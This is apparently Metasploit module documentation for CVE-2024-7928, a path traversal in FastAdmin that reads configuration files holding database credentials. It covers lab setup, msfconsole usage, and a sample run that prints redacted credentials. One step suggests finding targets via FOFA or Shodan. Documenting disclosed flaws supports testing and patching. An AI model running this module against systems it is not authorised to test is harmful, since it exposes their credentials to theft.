## Vulnerable Application

This module exploits a path traversal vulnerability in FastAdmin versions up to `1.3.3.20220121`, specifically within the `/index/ajax/lang` endpoint.
By manipulating the `lang` parameter, unauthenticated remote attackers can access arbitrary files on the server, such as configuration files containing sensitive credentials.
The vulnerability (CVE-2024-7928) has been publicly disclosed and is fixed in version `1.3.4.20220530`.

- Affected version: <= 1.3.3.20220121
- Fixed version: 1.3.4.20220530
- CVE: [CVE-2024-7928](https://nvd.nist.gov/vuln/detail/CVE-2024-7928)
- Advisory: https://s4e.io/tools/fastadmin-path-traversal-cve-2024-7928

---

## Target Setup

To set up a test environment using the vulnerable version of FastAdmin:

1. **Install Dependencies**
   Ensure you have the following installed:
   - PHP >= 7.1
   - MySQL or MariaDB
   - Web server (Apache or Nginx)

2. **Download Vulnerable FastAdmin Version from Official Repo**
   ```bash
   git clone https://github.com/fastadminnet/fastadmin.git
   cd fastadmin
   git checkout 1.3.3.20220121
   ```

3. **Move to Web Server Directory**
   Copy or move the project to your web server root:
   ```bash
   sudo mv fastadmin /var/www/html/
   cd /var/www/html/fastadmin
   ```

4. **Set Permissions**
   ```bash
   sudo chown -R www-data:www-data .
   sudo chmod -R 755 .
   ```

5. **Create Database**
   Log into MySQL and run:
   ```sql
   CREATE DATABASE fastadmin DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
   ```

6. **Configure Database Connection**
   Edit `application/database.php` and set your DB credentials:
   ```php
   'hostname' => '127.0.0.1',
   'database' => 'fastadmin',
   'username' => 'root',
   'password' => 'yourpassword',
   ```

7. **Import the Database Schema**
   ```bash
   mysql -u root -p fastadmin < fastadmin.sql
   ```

---

## Verification Steps

1. Install the vulnerable version of FastAdmin or find targets using FOFA/Shodan.
2. Start `msfconsole`
3. Run:
   ```
   use auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928
   ```
4. Set `RHOSTS` and `RPORT`
   ```
   set RHOSTS 192.0.2.10
   set RPORT 80  # Or the port you are targeting

   ```
5. Run the module with `run`
6. On success, database credentials should be printed to the console

---

## Options

```
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > show options

Module options (auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.0.2.10       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to FastAdmin instance
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host
```

---

## Scenarios

### FastAdmin 1.3.3.20220121 deployed with default configuration

```
msf6 > use auxiliary/scanner/http/fastadmin_path_traversal_cve_2024_7928
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > set RHOSTS 192.0.2.10
rhosts => 192.0.2.10
msf6 auxiliary(scanner/http/fastadmin_path_traversal_cve_2024_7928) > run
[+] 192.0.2.10 is vulnerable!
[+] DB Type   : mysql
[+] Hostname  : <redacted>
[+] Database  : fastadmin
[+] Username  : root
[+] Password  : <redacted>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
